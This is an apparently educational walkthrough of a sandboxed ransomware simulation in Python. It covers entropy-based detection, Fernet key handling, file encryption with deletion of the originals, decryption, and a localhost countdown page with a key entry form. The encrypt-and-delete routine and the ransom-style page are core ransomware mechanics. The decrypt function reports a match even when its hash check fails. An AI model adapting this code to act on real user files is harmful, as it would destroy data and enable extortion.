Shannon Entropy Calculation (Behavioral Heuristic Detection)

Ransomware.py 
def calculate_shannon_entropy(data: bytes) -> float:
    """
    Shannon Entropy H(X) = -sum(p(x) * log2(p(x)))
    Measures degree of randomness:
      - Normal plaintext/code: 3.5 to 5.5 bits/byte
      - Compressed/Encrypted data: 7.9 to 8.0 bits/byte
    """
    if not data:
        return 0.0
    freq = Counter(data)
    total_len = len(data)
    entropy = 0.0
    for count in freq.values():
        p_x = count / total_len
        if p_x > 0:
            entropy -= p_x * math.log2(p_x)
    return round(entropy, 2)

What This Code Does:

Calculates the randomness of any file's byte stream from 0.0 to 8.0. Encrypted files exhibit near-maximum entropy (~7.98 bits), while plain text files average around 4.5 bits.

How It Works:

  • Counts the frequency of all 256 possible byte values using collections.Counter.
  • Divides each count by total bytes to compute probability p_x.
  • Applies the classic information theory formula: entropy -= p_x * log2(p_x).

def generate_and_save_key(self) -> bytes:
    """
    Generates a cryptographically strong 32-byte URL-safe base64 key
    used for AES-128 in CBC mode and authenticated with HMAC-SHA256.
    """
    key = Fernet.generate_key()
    self.session_key = key.decode("utf-8")
    with open(self.key_file_path, "wb") as f:
        f.write(key)
    return key

What This Code Does:

Produces an authenticated symmetric key using the industrial-standard cryptography.fernet engine and saves it to an isolated key storage file.

How It Works:

  • Generates 32 random bytes from OS entropy source (CSPRNG).
  • Encodes into a 128-bit AES encryption key + 128-bit HMAC signing key.
  • Stores the key safely so full recovery is always guaranteed during academic demonstrations.

def encrypt_single_file(self, file_obj: SandboxFile, fernet: Fernet) -> bool:
    old_path = os.path.join(self.sandbox_dir, file_obj.filename)
    new_filename = file_obj.original_name + self.TARGET_EXTENSION
    new_path = os.path.join(self.sandbox_dir, new_filename)

    with open(old_path, "rb") as f:
        plaintext = f.read()

    ciphertext = fernet.encrypt(plaintext)
    payload = self.FILE_WARNING_HEADER.encode("utf-8") + ciphertext

    with open(new_path, "wb") as f:
        f.write(payload)

    os.remove(old_path)
    file_obj.filename = new_filename
    file_obj.status = "LOCKED"
    return True

What This Code Does:

Encrypts individual target files inside ./sandbox_data/, prepends a simulation warning header, renames to .LOCKED_SIM, and removes the raw plaintext.

How It Works:

  • Reads source binary data safely within sandbox bounds.
  • Calls fernet.encrypt() to encrypt and sign the payload.
  • Prepends simulation header and writes to destination file.
  • Deletes unencrypted original safely.

def decrypt_single_file(self, file_obj: SandboxFile, provided_key: str):
    key_bytes = self.load_key()
    fernet = Fernet(key_bytes)
    enc_path = os.path.join(self.sandbox_dir, file_obj.filename)
    orig_path = os.path.join(self.sandbox_dir, file_obj.original_name)

    with open(enc_path, "rb") as f:
        file_bytes = f.read()

    marker = self.FILE_HEADER_MARKER
    ciphertext = file_bytes.split(marker, 1)[1] if marker in file_bytes else file_bytes

    decrypted_bytes = fernet.decrypt(ciphertext)
    with open(orig_path, "wb") as f:
        f.write(decrypted_bytes)
    os.remove(enc_path)

    # Prove zero-corruption with cryptographic hash
    restored_hash = hashlib.sha256(decrypted_bytes).hexdigest()
    integrity_pass = (restored_hash == file_obj.original_hash)
    file_obj.status = "NORMAL"
    return True, "100% SHA-256 Match"

What This Code Does:

Reverses the process: extracts the ciphertext, decrypts via the symmetric key, restores the original file, and cryptographically proves zero corruption with SHA-256 checksums.

How It Works:

  • Locates the encrypted file and separates the alert header from ciphertext.
  • Executes fernet.decrypt() which validates the HMAC before decrypting.
  • Writes original plaintext to disk and calculates its SHA-256 hash.
  • Compares with the pre-encryption hash to guarantee 100% integrity.

def _run_server(self):
    class CustomServer(HTTPServer):
        def __init__(server_self, addr, handler):
            super().__init__(addr, handler)
            server_self.engine = self.engine

    try:
        server = CustomServer(("127.0.0.1", 8080), EmbeddedVictimHandler)
        self.http_server = server
        server.serve_forever()
    except Exception as e:
        print(f"[!] Server error: {e}")

# In __init__:
# Run daemon thread so main GUI thread remains responsive
t = threading.Thread(target=self._run_server, daemon=True)
t.start()

What This Code Does:

Runs a background web server on http://localhost:8080 inside the GUI application without requiring external web frameworks or separate server scripts.

How It Works:

  • Creates a lightweight HTTPServer bound strictly to local loopback (127.0.0.1).
  • Launches in a background daemon=True thread so Tkinter's event loop never freezes.
  • Serves a live countdown page with an interactive key entry form for decryption.
